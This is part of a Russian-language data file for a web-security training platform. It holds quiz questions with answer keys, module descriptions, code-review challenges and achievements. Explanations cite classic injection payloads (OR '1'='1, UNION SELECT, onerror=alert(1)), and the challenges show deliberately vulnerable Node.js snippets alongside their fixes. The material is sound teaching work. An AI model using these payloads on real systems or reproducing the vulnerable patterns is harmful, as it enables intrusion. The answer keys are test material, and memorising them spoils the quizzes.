      'Эта строка закрывает кавычку username и добавляет OR \\\'1\\\'=\\\'1\\\'. Поскольку 1=1 всегда истинно, запрос возвращает все строки таблицы пользователей, что позволяет войти без знания реального пароля.',
  },
  {
    id: 'sql-3',
    category: 'SQL-инъекции',
    question: 'Для чего используется SQL-комментарий (-- ) при атаке?',
    options: [
      'Для ускорения выполнения запроса',
      'Для комментирования оставшейся части SQL-запроса',
      'Для обхода фаервола',
      'Для шифрования запроса',
    ],
    correctIndex: 1,
    explanation:
      'SQL-комментарий (-- ) превращает всё после него в комментарий. Это позволяет злоумышленнику «обрезать» ненужную часть запроса (например, проверку пароля), оставляя только нужное условие.',
  },
  {
    id: 'sql-4',
    category: 'SQL-инъекции',
    question: 'Какой оператор позволяет объединить результаты двух SELECT-запросов?',
    options: ['JOIN', 'UNION', 'MERGE', 'COMBINE'],
    correctIndex: 1,
    explanation:
      'UNION объединяет результаты двух или более SELECT-запросов в один набор. При SQL-инъекции злоумышленник может использовать UNION SELECT для извлечения данных из других таблиц.',
  },
  {
    id: 'sql-5',
    category: 'SQL-инъекции',
    question: 'Что такое «слепая» SQL-инъекция (Blind SQL Injection)?',
    options: [
      'Инъекция без использования SQL-комментариев',
      'Атака, при которой сервер не возвращает данные напрямую, а отвечает «да/нет»',
      'Инъекция через аудиоканал',
      'Атака на мобильные приложения',
    ],
    correctIndex: 1,
    explanation:
      'При слепой SQL-инъекции сервер не отображает результаты запроса, но злоумышленник может делать логические выводы по поведению приложения (оно показывает разные страницы при истинных и ложных условиях). Это позволяет постепенно извлекать данные посимвольно.',
  },
  // XSS
  {
    id: 'xss-1',
    category: 'XSS-атаки',
    question: 'В чём главное отличие DOM-based XSS от отражённого?',
    options: [
      'DOM XSS работает только в Chrome',
      'При DOM XSS вредоносный код вообще не отправляется на сервер',
      'Отражённый XSS более опасный',
      'DOM XSS требует HTTPS',
    ],
    correctIndex: 1,
    explanation:
      'DOM-based XSS полностью выполняется на стороне клиента. Вредоносный код содержится в URL-фрагменте, location.hash или другом клиентском источнике и модифицирует DOM напрямую через JavaScript, вообще не взаимодействуя с сервером.',
  },
  {
    id: 'xss-2',
    category: 'XSS-атаки',
    question: 'Какое свойство JavaScript безопаснее для вставки текста?',
    options: ['innerHTML', 'outerHTML', 'textContent', 'document.write'],
    correctIndex: 2,
    explanation:
      'textContent вставляет только текст, автоматически кодируя спецсимволы. HTML-теги не интерпретируются как разметка, что предотвращает XSS-атаки. innerHTML и document.write интерпретируют HTML, что делает их опасными.',
  },
  {
    id: 'xss-3',
    category: 'XSS-атаки',
    question: 'Что делает HTTP-заголовок Content Security Policy (CSP)?',
    options: [
      'Шифрует содержимое страницы',
      'Ограничивает источники, откуда можно загружать скрипты и ресурсы',
      'Ускоряет загрузку страницы',
      'Включает сжатие данных',
    ],
    correctIndex: 1,
    explanation:
      'CSP позволяет указать допустимые источники для скриптов, стилей, изображений и других ресурсов. Например, Content-Security-Policy: script-src \\\'self\\\' запрещает загрузку скриптов из любых источников, кроме текущего домена, что блокирует большинство XSS-атак.',
  },
  {
    id: 'xss-4',
    category: 'XSS-атаки',
    question: 'Какой тип XSS наиболее опасный?',
    options: ['Отражённый', 'DOM-based', 'Хранимый (Stored)', 'Все одинаково опасны'],
    correctIndex: 2,
    explanation:
      'Хранимый XSS наиболее опасен, потому что вредоносный код сохраняется на сервере и выполняется для каждого пользователя, открывающего страницу. Злоумышленнику достаточно один раз внедрить скрипт, и он будет работать постоянно.',
  },
  {
    id: 'xss-5',
    category: 'XSS-атаки',
    question: 'Какой атрибут HTML-тега чаще всего используется для XSS-атак?',
    options: ['style', 'class', 'onerror / onload / onclick', 'href'],
    correctIndex: 2,
    explanation:
      'Обработчики событий (onerror, onload, onclick и др.) позволяют выполнить JavaScript при определённых событиях. Например, <img src=x onerror=alert(1)> выполнит alert при ошибке загрузки изображения. Атрибут style может использоваться для CSS-инъекций, но менее опасен.',
  },
  // CSRF
  {
    id: 'csrf-1',
    category: 'CSRF',
    question: 'Что такое CSRF-атака?',
    options: [
      'Кража паролей через поддельный сайт',
      'Выполнение нежелательных действий от имени аутентифицированного пользователя',
      'Перехват сетевого трафика',
      'DDoS-атака на сервер',
    ],
    correctIndex: 1,
    explanation:
      'CSRF (Cross-Site Request Forgery) — это атака, при которой злоумышленник заставляет браузер жертвы отправить HTTP-запрос к уязвимому сайту. Поскольку браузер автоматически прикрепляет куки аутентификации, сервер воспринимает запрос как легитимный.',
  },
  {
    id: 'csrf-2',
    category: 'CSRF',
    question: 'Какой механизм наиболее эффективен для защиты от CSRF?',
    options: [
      'Использование HTTPS',
      'CSRF-токены (anti-CSRF tokens)',
      'Сложные пароли',
      'Rate Limiting',
    ],
    correctIndex: 1,
    explanation:
      'CSRF-токены — это уникальные случайные значения, сервер генерирует их для каждой сессии или формы. При отправке запроса токен должен быть включён, и сервер проверяет его валидность. Злоумышленник не может получить токен из-за политики одного источника (Same-Origin Policy).',
  },
  {
    id: 'csrf-3',
    category: 'CSRF',
    question: 'Какое значение cookie-атрибута SameSite обеспечивает лучшую защиту?',
    options: ['None', 'Lax', 'Strict', 'Off'],
    correctIndex: 2,
    explanation:
      'SameSite=Strict запрещает отправку куки с любыми кросс-сайтовыми запросами. SameSite=Lax разрешает куки для навигации (GET-запросов по ссылке), но блокирует для POST-запросов из форм. None не ограничивает отправку и требует Secure-атрибут.',
  },
  {
    id: 'csrf-4',
    category: 'CSRF',
    question: 'Почему браузер автоматически отправляет куки при CSRF-атаке?',
    options: [
      'Из-за бага в браузере',
      'Это стандартное поведение HTTP-куки',
      'Злоумышленник заставляет его это делать',
      'Только в старых браузерах',
    ],
    correctIndex: 1,
    explanation:
      'По спецификации HTTP, браузер автоматически прикрепляет куки к запросам к домену, для которого они установлены. Это фундаментальное поведение куки. Злоумышленник создаёт страницу, которая отправляет запрос к целевому сайту, и браузер автоматически включает куки аутентификации.',
  },
  {
    id: 'csrf-5',
    category: 'CSRF',
    question: 'Почему AJAX-запросы с CORS не защищают от CSRF по умолчанию?',
    options: [
      'CORS блокирует все кросс-доменные запросы',
      'Формы HTML не подчиняются CORS — они могут отправлять POST без preflight',
      'AJAX-запросы не используют куки',
      'CORS нужен только для WebSocket',
    ],
    correctIndex: 1,
    explanation:
      'HTML-формы (<form>) могут отправлять POST-запросы к любому домену без проверки CORS. CORS (и preflight-запросы) применяется только к определённым типам AJAX-запросов. Поэтому CSRF-атака через скрытую HTML-форму полностью обходит CORS.',
  },
  // Auth
  {
    id: 'auth-1',
    category: 'Аутентификация',
    question: 'Какой алгоритм рекомендуется для хеширования паролей?',
    options: ['MD5', 'SHA-256', 'bcrypt', 'Base64'],
    correctIndex: 2,
    explanation:
      'bcrypt специально разработан для хеширования паролей. Он включает соль (salt) для защиты от rainbow-таблиц и настраиваемый фактор сложности (cost), который замедляет перебор. MD5 устарел и уязвим, SHA-256 слишком быстрый, Base64 — это кодировка, не хеширование.',
  },
  {
    id: 'auth-2',
    category: 'Аутентификация',
    question: 'Что такое «соль» (salt) при хешировании паролей?',
    options: [
      'Зашифрованный пароль',
      'Случайные данные, добавляемые к паролю перед хешированием',
      'Ключ для расшифровки хеша',
      'Второй фактор аутентификации',
    ],
    correctIndex: 1,
    explanation:
      'Соль — это случайное значение, уникальное для каждого пользователя, которое добавляется к паролю перед хешированием. Это предотвращает использование заранее вычисленных таблиц (rainbow tables) и обеспечивает, что одинаковые пароли имеют разные хеши.',
  },
  {
    id: 'auth-3',
    category: 'Аутентификация',
    question: 'Какой принцип безопасности нарушается, если сервер возвращает разные сообщения для «пользователь не найден» и «неправильный пароль»?',
    options: [
      'Принцип наименьших привилегий',
      'Защита от перебора (brute-force protection)',
      'Защита от перечисления пользователей (user enumeration)',
      'Разделение обязанностей',
    ],
    correctIndex: 2,
    explanation:
      'Разные сообщения позволяют злоумышленнику определить, существует ли аккаунт с указанным email. Злоумышленник может перебирать email-адреса и собирать список пользователей для последующих атак. Правильный подход — единое сообщение: «Неверные учётные данные».',
  },
  {
    id: 'auth-4',
    category: 'Аутентификация',
    question: 'Что такое JWT (JSON Web Token)?',
    options: [
      'Способ шифрования данных',
      'Токен для хранения пароля в браузере',
      'Подписанный/зашифрованный набор данных для передачи информации между сторонами',
      'База данных пользователей',
    ],
    correctIndex: 2,
    explanation:
      'JWT — это компактный, URL-безопасный токен, состоящий из трёх частей: Header (заголовок с алгоритмом), Payload (полезные данные, такие как id и роль пользователя) и Signature (подпись, обеспечивающая целостность). Он используется для аутентификации и авторизации без хранения состояния на сервере.',
  },
  {
    id: 'auth-5',
    category: 'Аутентификация',
    question: 'Сколько символов должен содержать надёжный пароль?',
    options: [
      'Минимум 6 символов',
      'Минимум 8 символов',
      'Минимум 12 символов',
      'Минимум 4 символа',
    ],
    correctIndex: 2,
    explanation:
      'Современные рекомендации NIST и других организаций предполагают минимум 12 символов для пароля. Длина является критически важным фактором безопасности — каждый дополнительный символ экспоненциально увеличивает время перебора. Пароль из 12+ символов с разными типами символов обеспечивает надёжную защиту.',
  },
  // General
  {
    id: 'general-1',
    category: 'Общая безопасность',
    question: 'Что такое OWASP?',
    options: [
      'Программный продукт для защиты серверов',
      'Международная организация по безопасности приложений',
      'Тип атаки на веб-приложения',
      'Язык программирования',
    ],
    correctIndex: 1,
    explanation:
      'OWASP (Open Worldwide Application Security Project) — это некоммерческая организация, которая занимается улучшением безопасности программного обеспечения. Её самым известным проектом является OWASP Top 10 — список десяти наиболее критических угроз безопасности веб-приложений.',
  },
  {
    id: 'general-2',
    category: 'Общая безопасность',
    question: 'Что такое Principle of Least Privilege (Принцип наименьших привилегий)?',
    options: [
      'Каждый пользователь должен иметь права администратора',
      'Каждому процессу и пользователю предоставляются минимально необходимые права',
      'Только администратор может получать доступ к данным',
      'Все пользователи равны в правах',
    ],
    correctIndex: 1,
    explanation:
      'Принцип наименьших привилегий означает, что каждому пользователю, процессу и системе должны предоставляться только те права, которые необходимы для выполнения их задач. Это ограничивает потенциальный ущерб при компрометации аккаунта или уязвимости.',
  },
  {
    id: 'general-3',
    category: 'Общая безопасность',
    question: 'Что такое HTTP-заголовок X-Frame-Options?',
    options: [
      'Определяет размер кадра изображения',
      'Предотвращает кликджекинг (clickjacking) — встраивание сайта в iframe',
      'Включает фреймворк JavaScript',
      'Настройка анимации',
    ],
    correctIndex: 1,
    explanation:
      'X-Frame-Options указывает браузеру, можно ли встраивать страницу в <frame> или <iframe>. Значение DENY полностью запрещает встраивание, SAMEORIGIN разрешает только с того же домена. Это защита от кликджекинга — атаки, при которой невидимый iframe с целевым сайтом накладывается на видимые элементы.',
  },
  {
    id: 'general-4',
    category: 'Общая безопасность',
    question: 'Что такое SSRF (Server-Side Request Forgery)?',
    options: [
      'Кража данных с сервера через forged request',
      'Когда сервер делает запросы к внутренним ресурсам по указанию злоумышленника',
      'Атака на DNS-сервер',
      'Подмена IP-адреса',
    ],
    correctIndex: 1,
    explanation:
      'SSRF позволяет злоумышленнику заставить серверное приложение делать HTTP-запросы к указанным URL. Это может быть использовано для доступа к внутренним ресурсам, облачным метаданным (например, AWS 169.254.169.254) или для сканирования внутренней сети.',
  },
  {
    id: 'general-5',
    category: 'Общая безопасность',
    question: 'Что означает акроним HTTPS?',
    options: [
      'HyperText Transfer Protocol Secure',
      'High Tech Transfer Protocol System',
      'HyperText Transfer Protocol Server',
      'HyperText Transfer Protocol Standard',
    ],
    correctIndex: 0,
    explanation:
      'HTTPS (HyperText Transfer Protocol Secure) — это расширение протокола HTTP, использующее шифрование TLS/SSL для защиты передаваемых данных. Это обеспечивает конфиденциальность (данные нельзя прочитать), целостность (данные нельзя изменить) и аутентификацию (сервер — это тот, за кого он себя выдаёт).',
  },
];

export const quizCategories = [
  { id: 'sql', name: 'SQL-инъекции', icon: 'Database', count: 5 },
  { id: 'xss', name: 'XSS-атаки', icon: 'FileText', count: 5 },
  { id: 'csrf', name: 'CSRF', icon: 'Link', count: 5 },
  { id: 'auth', name: 'Аутентификация', icon: 'Lock', count: 5 },
  { id: 'general', name: 'Общая безопасность', icon: 'Shield', count: 5 },
];

// ============================================================
// Modules config
// ============================================================
export const modules = [
  {
    id: 'owasp',
    title: 'OWASP Top 10',
    description: 'Интерактивный гид по 10 самым критическим угрозам безопасности веб-приложений с примерами кода и способами защиты.',
    icon: 'Shield',
    difficulty: 'Начальный',
    difficultyColor: 'bg-green-100 text-green-800',
    lessons: 10,
    totalSteps: 10,
  },
  {
    id: 'sql-injection',
    title: 'SQL-инъекции',
    description: 'Практическая лаборатория по изучению SQL-инъекций: от простого обхода аутентификации до сложных атак UNION.',
    icon: 'Database',
    difficulty: 'Средний',
    difficultyColor: 'bg-yellow-100 text-yellow-800',
    lessons: 4,
    totalSteps: 4,
  },
  {
    id: 'xss',
    title: 'XSS-атаки',
    description: 'Изучите три типа XSS-уязвимостей: отражённый, хранимый и DOM-based. Интерактивные демонстрации атак.',
    icon: 'FileText',
    difficulty: 'Средний',
    difficultyColor: 'bg-yellow-100 text-yellow-800',
    lessons: 3,
    totalSteps: 3,
  },
  {
    id: 'csrf',
    title: 'CSRF-атаки',
    description: 'Визуальная симуляция CSRF-атаки с пошаговой демонстрацией и механизмами защиты.',
    icon: 'Link',
    difficulty: 'Средний',
    difficultyColor: 'bg-yellow-100 text-yellow-800',
    lessons: 1,
    totalSteps: 1,
  },
  {
    id: 'auth',
    title: 'Аутентификация',
    description: 'Тренажёры: проверка надёжности пароля, визуализация брутфорса, демо хеширования, безопасность сессий.',
    icon: 'Lock',
    difficulty: 'Начальный',
    difficultyColor: 'bg-green-100 text-green-800',
    lessons: 4,
    totalSteps: 4,
  },
  {
    id: 'secure-coding',
    title: 'Безопасное кодирование',
    description: 'Задачи по ревью кода: найдите уязвимость в фрагменте кода и выберите правильное решение.',
    icon: 'Code',
    difficulty: 'Продвинутый',
    difficultyColor: 'bg-red-100 text-red-800',
    lessons: 5,
    totalSteps: 5,
  },
  {
    id: 'tools',
    title: 'Инструменты безопасности',
    description: 'Интерактивные инструменты: шифры (Цезарь, Виженер, XOR), кодирование (Base64, URL), хеш-функции и генератор паролей.',
    icon: 'KeyRound',
    difficulty: 'Начальный',
    difficultyColor: 'bg-green-100 text-green-800',
    lessons: 4,
    totalSteps: 4,
  },
];

// ============================================================
// Secure Coding Challenges
// ============================================================
export const secureCodingChallenges = [
  {
    id: 'sc-1',
    title: 'Инъекция в SQL-запросе',
    category: 'SQL-инъекция',
    code: `app.get('/api/user/:id', (req, res) => {
  const query = "SELECT * FROM users WHERE id = " + req.params.id;
  db.query(query, (err, result) => {
    res.json(result);
  });
});`,
    options: [
      { text: 'Добавить валидацию: if (isNaN(req.params.id)) return res.status(400)', correct: false },
      { text: 'Использовать параметризованный запрос: db.query("SELECT * FROM users WHERE id = ?", [req.params.id])', correct: true },
      { text: 'Шифровать параметр id перед использованием', correct: false },
      { text: 'Использовать HTTPS для этого эндпоинта', correct: false },
    ],
    explanation:
      'Конкатенация строки с пользовательским вводом создаёт SQL-инъекцию. Злоумышленник может передать id=1 OR 1=1 и получить все записи. Параметризованные запросы безопасны, так как данные передаются отдельно от SQL-кода.',
  },
  {
    id: 'sc-2',
    title: 'Хранение пароля в открытом виде',
    category: 'Криптография',
    code: `const user = new User({
  username: req.body.username,
  password: req.body.password,  // Сохраняется как есть
  email: req.body.email
});
await user.save();`,
    options: [
      { text: 'Зашифровать пароль через Base64', correct: false },
      { text: 'Хешировать пароль через bcrypt с солью перед сохранением', correct: true },
      { text: 'Хранить пароль в отдельной таблице', correct: false },
      { text: 'Установить сложные требования к паролю', correct: false },
    ],
    explanation:
      'Пароли нельзя хранить в открытом виде. Base64 — это кодировка, а не шифрование (легко обратимо). Правильное решение — использовать bcrypt для создания криптографического хеша с солью. Восстановить пароль из хеша невозможно.',
  },
  {
    id: 'sc-3',
    title: 'XSS через innerHTML',
    category: 'XSS',
    code: `function showSearchResult(query) {
  const el = document.getElementById('results');
  el.innerHTML = "Результаты для: " + query;
}`,
    options: [
      { text: 'Удалить элемент results', correct: false },
      { text: 'Использовать textContent вместо innerHTML', correct: true },
      { text: 'Добавить try-catch', correct: false },
      { text: 'Использовать setTimeout', correct: false },
    ],
    explanation:
      'innerHTML интерпретирует HTML-теги в строке. Если query содержит <script>alert(1)</script>, код будет выполнен. textContent вставляет текст как есть, кодируя спецсимволы — XSS невозможен.',
  },
  {
    id: 'sc-4',
    title: 'Отсутствие проверки авторизации',
    category: 'Контроль доступа',
    code: `app.delete('/api/users/:id', async (req, res) => {
  await User.findByIdAndDelete(req.params.id);
  res.json({ message: 'Пользователь удалён' });
});`,
    options: [
      { text: 'Добавить middleware аутентификации и проверку прав', correct: true },
      { text: 'Изменить метод на POST', correct: false },
      { text: 'Добавить CAPTCHA', correct: false },
      { text: 'Логировать все удаления', correct: false },
    ],
    explanation:
      'Этот эндпоинт не проверяет, авторизован ли пользователь и имеет ли он права удалять пользователей. Любой запрос может удалить любую запись. Необходим middleware авторизации и проверка, что пользователь удаляет только свой аккаунт или является администратором.',
  },
  {
    id: 'sc-5',
    title: 'Информация об ошибке в продакшене',
    category: 'Конфигурация',
    code: `app.use((err, req, res, next) => {
  res.status(500).json({
    error: err.message,
    stack: err.stack  // Полный stack trace!
  });
});`,
    options: [
      { text: 'Удалить обработчик ошибок', correct: false },
      { text: 'В продакшене скрывать детали ошибок, показывать только общее сообщение', correct: true },
      { text: 'Добавить try-catch в каждый маршрут', correct: false },
      { text: 'Использовать HTTPS', correct: false },
    ],
    explanation:
      'Показ stack trace в продакшене раскрывает структуру приложения, пути к файлам, версии библиотек и другие данные, полезные для злоумышленника. В продакшене нужно показывать общее сообщение и логировать детали ошибки на сервере.',
  },
];

// ============================================================
// Achievements
// ============================================================
export const achievements = [
  {
    id: 'first-steps',
    title: 'Первые шаги',
    description: 'Завершите свой первый модуль обучения.',
    condition: 'Пройдите любой модуль',
  },
  {
    id: 'sql-master',
    title: 'SQL-мастер',
    description: 'Завершите все задания лаборатории SQL-инъекций.',
    condition: 'Пройдите модуль SQL-инъекции',
  },
  {
    id: 'xss-hunter',
    title: 'Охотник на XSS',
    description: 'Изучите все три типа XSS-атак.',
    condition: 'Пройдите модуль XSS',
  },
  {
    id: 'security-guard',
    title: 'Страж безопасности',
    description: 'Изучите все 10 категорий OWASP Top 10.',
    condition: 'Изучите все пункты OWASP Top 10',
  },
  {
    id: 'auth-expert',
    title: 'Эксперт по аутентификации',
    description: 'Завершите модуль безопасности аутентификации.',
    condition: 'Пройдите модуль Аутентификация',
  },
  {
    id: 'code-reviewer',
    title: 'Код-ревьюер',
    description: 'Завершите все задания безопасного кодирования.',
    condition: 'Пройдите модуль Безопасное кодирование',
  },
  {
    id: 'quiz-master',
    title: 'Мастер квизов',
    description: 'Пройдите квизы в 3 и более категориях.',
    condition: 'Завершите 3 квиза',
  },
  {
    id: 'quiz-perfect',
    title: 'Безупречный результат',
    description: 'Получите 100% в любом квизе.',
    condition: 'Наберите 100% в квизе',
  },
  {
    id: 'crypto-ninja',
    title: 'Криптограф-ниндзя',
    description: 'Завершите модуль инструментов безопасности.',
    condition: 'Пройдите модуль Инструменты',
  },
  {
    id: 'full-completion',
    title: 'Полное прохождение',
    description: 'Завершите все обучающие модули платформы.',
    condition: 'Пройдите все 7 модулей',
  },
];
